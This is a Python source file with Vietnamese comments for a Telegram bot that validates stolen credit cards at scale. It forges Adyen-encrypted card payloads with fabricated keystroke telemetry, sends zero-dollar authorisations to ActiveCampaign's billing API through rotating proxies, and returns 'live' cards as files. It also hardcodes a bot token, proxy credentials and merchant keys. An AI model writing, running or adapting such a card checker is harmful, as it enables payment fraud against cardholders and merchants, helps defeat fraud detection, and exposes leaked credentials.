import os
import json
import hmac
import hashlib
import base64
import re
import string
import random
import sys
import time
import uuid
import threading
import queue
import io
import psutil
import asyncio
from datetime import datetime

# Thư viện mã hóa
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP, AES
from Cryptodome.Util.Padding import pad
from jose import jwk

# Thư viện Request (PycURL)
import pycurl

# Thư viện Telegram Bot
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# ===================================================================
# === CẤU HÌNH GLOBAL
# ===================================================================

# Số luồng mặc định
DEFAULT_THREADS = 100

# Biến toàn cục để theo dõi trạng thái
current_stats = {
    "total": 0,
    "checked": 0,
    "live": 0,
    "die": 0,
    "error": 0,
    "start_time": 0,
    "is_running": False
}

# Queue chứa thẻ
card_queue = queue.Queue()

# Danh sách kết quả để ghi file
live_results = []
die_results = []

# Lock cho thread safety
stats_lock = threading.Lock()

# ===================================================================
# === PHẦN 1: CÁC HÀM VALIDATION THẺ & LOGIC MÃ HÓA (GIỮ NGUYÊN)
# ===================================================================

def normalize_card(card_str):
    """Chuẩn hóa chuỗi thẻ về định dạng cc|mm|yyyy|cvv."""
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    
    month_int = int(month)
    if month_int < 1 or month_int > 12:
        return None
    month = month.zfill(2)
    
    if len(year) == 2:
        year = '20' + year
    year_int = int(year)
    if year_int < 2000 or year_int > 2099:
        return None
        
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19:
        return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'

def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(input_len):
    log_entries = []
    current_time = random.randint(2000, 5000)
    log_entries.append(f"fo@{current_time}")
    current_time += random.randint(50, 200)
    log_entries.append(f"cl@{current_time}")
    current_time += random.randint(100, 300)
    for _ in range(input_len):
        log_entries.append(f"KN@{current_time}")
        current_time += random.randint(60, 180)
    return ",".join(log_entries)

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e:
        return bytearray(0)
    if len(e) % 2 == 1:
        e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32

def mt(e, t, r):
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        if len(parts) != 2:
            raise ValueError("Malformed public key")
        part1 = parts[0]
        part2 = parts[1]
        decoded_part1 = k(part1)
        decoded_part2 = k(part2)
        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)
        self.key_object = {
            "kty": "RSA",
            "kid": "asf-key",
            "e": encoded_part1,
            "n": encoded_part2,
            "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)
        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        aes_key = cek[32:]
        hmac_key = cek[:32]
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)
        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]
        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not all([card, month, year, cvc, adyen_key]):
        raise ValueError("Missing card details")
    if not stripe_key: stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain: domain = "https://www.mytheresa.com"
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.0/securedFields.html?type=card&d={domain_b64}"
    card_number = format_card_number(card)
    fake_number_log = generate_fake_log(16)
    fake_cvc_log = generate_fake_log(3)
    card_detail = {
        "encryptedCardNumber": {"number": card_number, "generationtime": get_current_timestamp(), "numberBind": "1", "activate": "3", "referrer": referrer, "numberFieldFocusCount": "1", "numberFieldLog": fake_number_log, "numberFieldClickCount": "1", "numberFieldKeyCount": "16"},
        "encryptedExpiryMonth": {"expiryMonth": month, "generationtime": get_current_timestamp()},
        "encryptedExpiryYear": {"expiryYear": year, "generationtime": get_current_timestamp()},
        "encryptedSecurityCode": {"cvc": cvc, "generationtime": get_current_timestamp(), "cvcBind": "1", "activate": "4", "referrer": referrer, "cvcFieldFocusCount": "1", "cvcFieldLog": fake_cvc_log, "cvcFieldClickCount": "1", "cvcFieldKeyCount": "3", "cvcFieldChangeCount": "1", "cvcFieldBlurCount": "1", "deactivate": "2"}
    }
    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
    return encrypted_details

def generate_browser_profile():
    chrome_version = random.randint(120, 131)
    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36"
    return {
        "user_agent": user_agent,
        "sec_ch_ua": f'"Not_A Brand";v="8", "Chromium";v="{chrome_version}", "Google Chrome";v="{chrome_version}"',
        "platform": '"Windows"'
    }

def generate_checkout_attempt_id():
    uuid_part = str(uuid.uuid4())
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=50))
    return f"{uuid_part}{suffix}"

# ===================================================================
# === PHẦN 2: CORE CHECKING LOGIC (MODIFIED FOR BOT)
# ===================================================================

def check_one_card(line_card):
    """
    Hàm xử lý logic check thẻ, trả về dict kết quả thay vì in ra console.
    """
    start_time_card = time.time() # Bắt đầu đo thời gian xử lý thẻ
    
    line_card = line_card.strip()
    normalized = normalize_card(line_card)
    
    if not normalized:
        return {"status": "ERROR", "msg": f"FORMAT ERROR: {line_card}", "raw": line_card}

    cc, mm, yyyy, cvc = normalized.split('|')

    if not validate_luhn(cc):
        return {"status": "ERROR", "msg": f"LUHN FAIL: {cc}", "raw": normalized}

    ADYEN_PUB_KEY = "10001|C740E51C2E7CEDAFC96AA470E575907B40E84E861C8AB2F4952423F704ABC29255A37C24DED6068F7D1E394100DAD0636A8362FC1A5AAE658BB9DA4262676D3BFFE126D0DF11C874DB9C361A286005280AD45C06876395FB60977C25BED6969A3A586CD95A3BE5BE2016A56A5FEA4287C9B4CAB685A243CFA04DC5C115E11C2473B5EDC595D3B97653C0EA42CB949ECDEA6BC60DC9EDF89154811B5E5EBF57FDC86B7949BA300F679716F67378361FF88E33E012F31DB8A14B00C3A3C2698D2CA6D3ECD9AE16056EE8E13DFFE2C99E1135BBFCE4718822AB8EA74BEBA4B1B99BBE43F2A6CC70882B6E5E1A917F8264180BE6CD7956967B9D8429BF9C0808004F"
    STRIPE_KEY = "live_CFDMTKEQ6RE5FPLXYTYYUGWJBUCBUWI7" 
    TARGET_DOMAIN = "https://www.activecampaign.com"

    data = {}
    max_retries = 20
    current_try = 0
    success_request = False
    
    # Logic Request
    while current_try < max_retries:
        try:
            encrypted_result = encrypt_card_data_480(
                card=cc, month=mm, year=yyyy, cvc=cvc, 
                adyen_key=ADYEN_PUB_KEY, stripe_key=STRIPE_KEY, domain=TARGET_DOMAIN
            )

            profile = generate_browser_profile()
            email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + '@gmail.com'
            city = 'New York' 
            telephoneNumber = ''.join(random.choices(string.digits, k=10))
            name = ''.join(random.choices(string.ascii_letters + ' ', k=10)).strip()
            attempt_id = generate_checkout_attempt_id()

            headers_list = [
                'accept: application/json, text/plain, */*',
                'accept-language: en-US,en;q=0.9',
                'cache-control: no-cache',
                'content-type: application/json',
                f'user-agent: {profile["user_agent"]}',
                f'sec-ch-ua: {profile["sec_ch_ua"]}',
                'sec-ch-ua-mobile: ?0',
                f'sec-ch-ua-platform: {profile["platform"]}',
                'origin: https://www.activecampaign.com',
                'pragma: no-cache',
                'referer: https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
                'sec-fetch-dest: empty',
                'sec-fetch-mode: cors',
                'sec-fetch-site: same-origin',
            ]

            json_data = {
                'paymentMethod': {
                    'type': 'scheme',
                    'holderName': name,
                    'encryptedCardNumber': encrypted_result['encryptedCardNumber'],
                    'encryptedExpiryMonth': encrypted_result['encryptedExpiryMonth'],
                    'encryptedExpiryYear': encrypted_result['encryptedExpiryYear'],
                    'encryptedSecurityCode': encrypted_result['encryptedSecurityCode'],
                    'brand': get_short_brand_name(cc),
                    'checkoutAttemptId': attempt_id,
                },
                'shopperEmail': email,
                'shopperName': name,
                'billingAddress': {'city': city, 'country': 'US', 'houseNumberOrName': '123', 'postalCode': '10001', 'stateOrProvince': 'NY', 'street': 'Broadway'},
                'telephoneNumber': telephoneNumber,
                'amount': {'value': 0, 'currency': 'USD'},
                'returnUrl': 'https://www.activecampaign.com/signup/?code=ac&tier=starter&contacts=1000&currency=USD',
            }

            post_body = json.dumps(json_data).encode('utf-8')

            buffer = io.BytesIO()
            c = pycurl.Curl()
            c.setopt(pycurl.URL, 'https://www.activecampaign.com/api/billing/adyen/payments')
            c.setopt(pycurl.POST, 1)
            c.setopt(pycurl.POSTFIELDS, post_body)
            c.setopt(pycurl.HTTPHEADER, headers_list)
            
            # Proxy Config
            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
            proxy_url = "http://aus.360s5.com:3600"
            base_auth = "88634867-zone-custom"
            pass_auth = "AetOKcLB"
            proxy_auth = f"{base_auth}-session-{session_id}:{pass_auth}"
            
            c.setopt(pycurl.PROXY, proxy_url)
            c.setopt(pycurl.PROXYUSERPWD, proxy_auth)
            c.setopt(pycurl.SSL_VERIFYPEER, 0)
            c.setopt(pycurl.SSL_VERIFYHOST, 0)
            c.setopt(pycurl.TIMEOUT, 30)
            c.setopt(pycurl.WRITEDATA, buffer)

            c.perform()
            c.close()

            response_text = buffer.getvalue().decode('utf-8')

            try:
                data = json.loads(response_text)
                success_request = True
                break
            except json.JSONDecodeError:
                pass

        except Exception:
            pass
        
        current_try += 1
        time.sleep(1)

    # Kết thúc đo thời gian
    time_taken = round(time.time() - start_time_card, 2)

    if not success_request:
        return {"status": "ERROR", "msg": "NETWORK_FAIL", "raw": normalized}

    additionalData = data.get('additionalData', {})
    cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
    cvcResult = additionalData.get('cvcResult', 'N/A')
    avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
    avsResult = additionalData.get('avsResult', 'N/A')
    refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
    refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
    resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
    message = data.get('message', 'N/A')

    if resultCode == "Authorised" or resultCode == "Cancelled":
        status = "LIVE"
        msg_short = "APPROVED ✅"
    elif resultCode == "Refused":
        status = "DIE"
        msg_short = f"DIE - {refusalReason}"
    elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
        status = "DIE" # Coi như DIE cho đơn giản hoặc tách ra
        msg_short = "3DS - 3D Secure required"
    else:
        status = "DIE"
        msg_short = f"UNK - {message if message != 'N/A' else resultCode}"

    result_string = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg_short}|Time: {time_taken}s"

    return {"status": status, "msg": result_string, "raw": normalized}

# ===================================================================
# === PHẦN 3: WORKER & BOT LOGIC
# ===================================================================

def worker_thread():
    while True:
        card = card_queue.get()
        if card is None:
            break
        
        try:
            res = check_one_card(card)
            
            with stats_lock:
                current_stats["checked"] += 1
                if res["status"] == "LIVE":
                    current_stats["live"] += 1
                    live_results.append(res["msg"])
                elif res["status"] == "DIE":
                    current_stats["die"] += 1
                    die_results.append(res["msg"])
                else:
                    current_stats["error"] += 1
                    die_results.append(f"{res.get('raw', 'unknown')}|ERROR")
                    
        except Exception as e:
            with stats_lock:
                current_stats["error"] += 1
        finally:
            card_queue.task_done()

# --- Handler: /st ---
async def check_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Vui lòng nhập thẻ. Ví dụ: /st 4000000000000000|01|2025|123")
        return

    card_input = args[0]
    await update.message.reply_text(f"⏳ Đang check: {card_input}...")
    
    # Chạy hàm check trong thread riêng để không block bot
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(None, check_one_card, card_input)
    
    if result["status"] == "LIVE":
        status_icon = "✅ LIVE"
    elif result["status"] == "DIE":
        status_icon = "❌ DIE"
    else:
        status_icon = "⚠️ ERROR"
        
    await update.message.reply_text(f"{status_icon}\n`{result['msg']}`", parse_mode='Markdown')

# --- Handler: File ---
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    
    # Chỉ nhận file .txt
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Vui lòng gửi file .txt chứa list thẻ.")
        return

    # Kiểm tra xem có đang chạy job nào không
    if current_stats["is_running"]:
        await update.message.reply_text("⚠️ Bot đang bận xử lý file khác. Vui lòng đợi.")
        return

    # Reset stats
    with stats_lock:
        current_stats["total"] = 0
        current_stats["checked"] = 0
        current_stats["live"] = 0
        current_stats["die"] = 0
        current_stats["error"] = 0
        current_stats["start_time"] = time.time()
        current_stats["is_running"] = True
        live_results.clear()
        die_results.clear()

    # Tải file
    file = await document.get_file()
    file_content = await file.download_as_bytearray()
    decoded_content = file_content.decode('utf-8', errors='ignore')
    
    cards = [line.strip() for line in decoded_content.splitlines() if line.strip()]
    current_stats["total"] = len(cards)

    if len(cards) == 0:
        await update.message.reply_text("❌ File rỗng.")
        current_stats["is_running"] = False
        return

    status_msg = await update.message.reply_text(f"🚀 Bắt đầu chạy {len(cards)} thẻ với {DEFAULT_THREADS} luồng...")

    # Nạp thẻ vào queue
    while not card_queue.empty():
        try: card_queue.get_nowait()
        except queue.Empty: break
        
    for card in cards:
        card_queue.put(card)

    # Khởi động Threads
    threads = []
    for _ in range(DEFAULT_THREADS):
        t = threading.Thread(target=worker_thread)
        t.daemon = True
        t.start()
        threads.append(t)

    # Task cập nhật Realtime Dashboard
    asyncio.create_task(update_dashboard(context, status_msg.chat_id, status_msg.message_id))

    # Chờ Queue xử lý xong (Non-blocking wait)
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(None, card_queue.join)
    
    # Dừng threads
    for _ in range(DEFAULT_THREADS):
        card_queue.put(None)
    
    current_stats["is_running"] = False

    # Gửi kết quả cuối cùng
    await send_final_report(update, context)

async def update_dashboard(context, chat_id, message_id):
    """Cập nhật tin nhắn trạng thái mỗi 1-2 giây."""
    last_text = ""
    while current_stats["is_running"]:
        # Tính toán thông số
        elapsed = time.time() - current_stats["start_time"]
        if elapsed < 1: elapsed = 1
        
        cpm = int((current_stats["checked"] / elapsed) * 60)
        progress = (current_stats["checked"] / current_stats["total"]) * 100 if current_stats["total"] > 0 else 0
        
        # System Resource
        cpu_usage = psutil.cpu_percent()
        ram_usage = psutil.virtual_memory().percent

        text = (
            f"⚡ **Checking Process** ⚡\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ Live: `{current_stats['live']}`\n"
            f"❌ Die: `{current_stats['die']}`\n"
            f"⚠️ Error: `{current_stats['error']}`\n"
            f"🔄 Total: `{current_stats['checked']}/{current_stats['total']}` ({progress:.1f}%)\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🚀 CPM: `{cpm}`\n"
            f"🖥 CPU: `{cpu_usage}%` | RAM: `{ram_usage}%`\n"
            f"⏱ Time: `{int(elapsed)}s`"
        )

        if text != last_text:
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id, 
                    message_id=message_id, 
                    text=text, 
                    parse_mode='Markdown'
                )
                last_text = text
            except Exception:
                pass # Bỏ qua lỗi flood wait nếu update quá nhanh
        
        await asyncio.sleep(1.5) # Cập nhật mỗi 1.5s

async def send_final_report(update, context):
    await update.message.reply_text("✅ **Hoàn thành!** Đang gửi file kết quả...", parse_mode='Markdown')
    
    # Gửi file Live
    if live_results:
        live_data = "\n".join(live_results)
        await update.message.reply_document(
            document=InputFile(io.BytesIO(live_data.encode('utf-8')), filename="live.txt"),
            caption=f"✅ Live: {len(live_results)}"
        )
    
    # Gửi file Die (nếu cần)
    if die_results:
        # Nếu file die quá lớn có thể chia nhỏ hoặc chỉ gửi nếu < 50MB
        die_data = "\n".join(die_results)
        await update.message.reply_document(
            document=InputFile(io.BytesIO(die_data.encode('utf-8')), filename="die.txt"),
            caption=f"❌ Die: {len(die_results)}"
        )

# --- Main Bot Setup ---
def main():
    # THAY TOKEN CỦA BẠN Ở ĐÂY
    TOKEN = "8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I"
    
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("st", check_single_card))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))

    print("Bot is running...")
    app.run_polling()

if __name__ == '__main__':
    main()
